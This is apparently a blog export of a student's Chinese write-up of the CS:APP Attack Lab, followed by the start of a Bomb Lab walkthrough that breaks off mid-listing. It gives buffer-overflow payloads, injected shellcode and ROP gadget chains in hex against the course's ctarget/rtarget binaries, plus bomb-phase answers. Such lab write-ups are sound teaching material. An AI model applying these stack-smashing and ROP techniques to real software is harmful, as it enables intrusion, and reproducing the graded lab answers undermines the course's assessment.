phase1</h3><ul><li><p><strong>任务目标</strong></p><p>让getbuf()函数返回touch1()</p></li><li><p><strong>实验步骤</strong></p><p>首先对ctarget进行gdb调试</p><p>然后对getbuf 进行反汇编</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" alt="image-20210330205208407"></p><p>对touch1进行反汇编</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" alt="image-20210330205255616"></p><p>可知getbuf()开辟了0x28，即40字节的空间，返回地址存在%rsp+0x28的地址，</p><p>而touch1的初始地址为0x004017c0</p><p>所以当我们存入缓冲区的数据，即touch1的初始地址可以覆盖这个返回地址时，我们就可以成功返回touch1了</p><p>攻击序列设置：</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>c0 17 40 00 00 00 00 00</p><p>以小端方式存储于1.txt中</p><p>用hex2raw转化为字符串，执行命令</p><figure class="highlight bnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></div></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" alt="image-20210330210214612"></p></li></ul><h3 id="2-phase2"><a class="markdownIt-Anchor" href="#2-phase2"></a> 2) phase2</h3><ul><li><p><strong>任务要求</strong></p><p>要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p></li><li><p><strong>实验步骤</strong></p><p>反汇编查看touch2地址</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" alt="image-20210330211924002"></p><p>要求我们把参数设置为cookie，即把%rdi的值改为cookie，再执行touch2. 即ret touch2的地址。</p><p>转化为汇编代码保存在1.s中，</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></div></td></tr></table></figure><p>用<code>gcc -c 1.s -o 1.o</code>指令转化为机器代码</p><p>并将其反汇编，保存在2.txt中，2.txt如图</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" alt="image-20210331210915437"></p><p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p><p><img src="/posts/9b9a13df/image-20210412193826843.png" alt="image-20210412193826843"></p><p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" alt="image-20210331211305114"></p><p><img src="/posts/9b9a13df/1433829-fa485a0533812b76.png" alt="img"></p><p>利用raw2hex转化为字符串</p><figure class="highlight bnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></div></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" alt="image-20210331211454524"></p></li></ul><h3 id="3-phase3"><a class="markdownIt-Anchor" href="#3-phase3"></a> 3) phase3</h3><ul><li><p><strong>任务要求</strong></p><p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p><p><img src="/posts/9b9a13df/image-20210412202523955.png" alt="image-20210412202523955"></p></li><li><p><strong>实验步骤</strong></p><p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p><p>所以注入代码为,保存在cs.s中</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></div></td></tr></table></figure><p>汇编和反汇编</p><p><img src="/posts/9b9a13df/image-20210412203205921.png" alt="image-20210412203205921"></p><p><img src="/posts/9b9a13df/image-20210412203220388.png" alt="image-20210412203220388"></p><p>利用man ascii将cookie转化为16进制</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>所以，注入序列为：</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>将其保存在touch_3.txt中，执行指令，可得：</p><p><img src="/posts/9b9a13df/image-20210412203956357.png" alt="image-20210412203956357"></p></li></ul><h3 id="4-phase4"><a class="markdownIt-Anchor" href="#4-phase4"></a> 4) phase4</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到<code>touch2</code>函数。只不过这个我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。</p></li><li><p><strong>实验步骤</strong></p><p>我们需要的代码序列：</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></div></td></tr></table></figure><p>其指令编码为：</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></div></td></tr></table></figure><p>在rtarget的反汇编代码中查找</p><p><img src="/posts/9b9a13df/image-20210412211719953.png" alt="image-20210412211719953"></p><p>所以popq %rax指令起始地址为：0x4019ab</p><p><img src="/posts/9b9a13df/image-20210412211839599.png" alt="image-20210412211839599"></p><p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p><p>所以得到字符串，保存在touch_4中：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>执行指令：</p><p><img src="/posts/9b9a13df/image-20210412212407837.png" alt="image-20210412212407837"></p></li></ul><h3 id="5-phase5"><a class="markdownIt-Anchor" href="#5-phase5"></a> 5) phase5</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们需要做的就是把字符串的起始地址，传送到<code>%rdi</code>,然后调用<code>touch3</code>函数。</p><p>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从<code>farm</code>中我们可以获取到这样一个<code>gadget</code>，<code>lea (%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传送到<code>%rax</code>。</p></li><li><p><strong>实验步骤</strong></p><p>解题思路：</p><p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br>（2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br>（3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br>（4）调用<code>touch3</code>函数</p></li></ul><p>(1) 第一步，获取到<code>%rsp</code>的地址</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></div></td></tr></table></figure><p>movq %rsp, %rax<code>的指令字节为：</code>48 89 e0<code>, 所以这一步的</code>gadget<code>地址为：</code>0x401a06</p><p>(2) 第二步，将<code>%rax</code>的内容传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></div></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>(3) 第三步，将偏移量的内容弹出到<code>%rax</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></div></td></tr></table></figure><p>popq %rax<code>的指令字节为：</code>58<code>， 其中</code>90<code>为</code>nop<code>指令, 所以这一步的</code>gadget<code>地址为：</code>0x4019cc</p><p>(4) 第四步，将<code>%eax</code>的内容传送到<code>%edx</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></div></td></tr></table></figure><p>movl %eax, %edx<code>的指令字节为:</code>89 c2<code>, 所以这一步的</code>gadget<code>地址为：</code>0x4019dd</p><p>(5) 第五步，将<code>%edx</code>的内容传送到<code>%ecx</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000000401a6e &lt;setval_167&gt;:<br>  401a6e: c7 07 89 d1 91 c3     movl   <span class="hljs-variable">$0xc391d189</span>,(%rdi)<br>  401a74: c3  <br><br></code></pre></div></td></tr></table></figure><p>movl %edx, %ecx<code>的指令字节为：</code>89 d1<code>，所以这一步的</code>gadget<code>地址为：</code>0x401a70</p><p>(6) 第六步，将<code>%ecx</code>的内容传送到<code>%esi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">0000000000401a11 <span class="hljs-tag">&lt;<span class="hljs-name">addval_436</span>&gt;</span>:<br>  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax<br>  401a17: c3                    retq <br><br></code></pre></div></td></tr></table></figure><p>movl %ecx, %esi<code>的指令字节为：</code>89 ce<code>, 所以这一步</code>gadget<code>地址为：</code>0x401a13</p><p>(7) 第七步，将栈顶 + 偏移量得到字符串的首地址传送到<code>%rax</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019d6 <span class="hljs-tag">&lt;<span class="hljs-name">add_xy</span>&gt;</span>:<br>  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax<br>  4019da: c3                    retq <br></code></pre></div></td></tr></table></figure><p>这一步的<code>gadget</code>地址为：<code>0x4019d6</code></p><p>(8) 将字符串首地址<code>%rax</code>传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></div></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>整个栈的结构如下：</p><p><img src="/posts/9b9a13df/1433829-cafcf76d35ef7ba1.png" alt="img"></p><p>所以要输入的字符串为：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></div></td></tr></table></figure><p>保存在touch_5.txt中，执行指令：</p><p><img src="/posts/9b9a13df/image-20210412213042512.png" alt="image-20210412213042512"></p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统Lab3-bomblab</title>
    <link href="/posts/2ee63cf/"/>
    <url>/posts/2ee63cf/</url>
    
    <content type="html"><![CDATA[<h1 id="lab3-bomb-lab"><a class="markdownIt-Anchor" href="#lab3-bomb-lab"></a> lab3 bomb lab</h1><h2 id="1-phase_1"><a class="markdownIt-Anchor" href="#1-phase_1"></a> 1. phase_1</h2><ul><li><strong>汇编代码：</strong></li></ul><p><img src="/posts/2ee63cf/image-20210316165036780.png" alt="image-20210316165036780"></p><ul><li><p><strong>指令思路:</strong></p><p>将地址$0x402400存到%esi中</p><p>调用函数&lt;strings_not_equal&gt;将用户输入的内容与寄存器%esi中的值比较，结果返回至%eax，若相同，则返回0，反之返回1；</p><p>test  将两个数相与，若为0，则ZF标志位变为1，反之ZF为0；</p><p>若ZF为1，则je指令跳转，跳过 了explode_bomb函数，破解成功，反之不跳转，爆炸。</p></li><li><p><strong>解决方法:</strong></p><p>因此地址$0x402400中存储的值即为我们需要知道的密码</p><p>运用GDB调试工具输入指令 :</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>/s <span class="hljs-number">0</span>x<span class="hljs-number">402400</span><br></code></pre></div></td></tr></table></figure></li></ul><p>可得密码为：Border relations with Canada have never been better.</p><p><img src="/posts/2ee63cf/image-20210315211917616.png" alt="image-20210315211917616"></p><p><img src="/posts/2ee63cf/image-20210316171734306.png" alt="image-20210316171734306"></p><h2 id="2-phase_2"><a class="markdownIt-Anchor" href="#2-phase_2"></a> 2. phase_2</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000400efc &lt;phase_2&gt;:<br>  400efc:55                   push   %rbp*备份<br>  400efd:53                   push   %rbx<br>  400efe:48 83 ec 28          sub    $0x28,%rsp  *开辟40字节空间<br>  400f02:48 89 e6             mov    %rsp,%rsi*<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;*读入六个数字，首个数字存放在栈顶%rsp<br>  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)*判断a[0]是否和1相等，不相等直接爆炸<br>  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;*相等则跳到$0x400f30<br>  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;<br>  400f17:8b 43 fc             mov    -0x4(%rbx),%eax*将当前数字的上一个数字存入%eax中<br>  400f1a:01 c0                add    %eax,%eax*将%eax存放的元素乘二<br>  400f1c:39 03                cmp    %eax,(%rbx)*与当前数字判断<br>  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;*相等则跳到$0x400f25，否则爆炸<br>  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f25:48 83 c3 04          add    $0x4,%rbx*取下一数字<br>  400f29:48 39 eb             cmp    %rbp,%rbx*与最后一个元素比较<br>  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;*不相等则回到$400f17，继续乘二判断操作<br>  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;*相等则结束，跳转进行清理栈区操作<br>  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx*将a[1]地址赋给%rba<br>  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp*将a[5]地址赋给%rbp,用作终止条件<br>  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;*直接跳转到$400f17<br>  400f3c:48 83 c4 28          add    $0x28,%rsp<br>  400f40:5b                   pop    %rbx<br>  400f41:5d                   pop    %rbp<br>  400f42:c3                   retq    <br></code></pre></div></td></tr></table></figure></li><li><p><strong>解决方法</strong></p><p>由上述指令思路可知，第一个数为1，且之后每个数都会是前一个的两倍，否则就会爆炸。</p><p>所以密码为：1 2 4 8 16 32</p><p><img src="/posts/2ee63cf/image-20210316171653420.png" alt="image-20210316171653420"></p></li></ul><h2 id="3-phase_3"><a class="markdownIt-Anchor" href="#3-phase_3"></a> 3. phase_3</h2><ul><li><p><strong>汇编代码</strong></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:<br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span 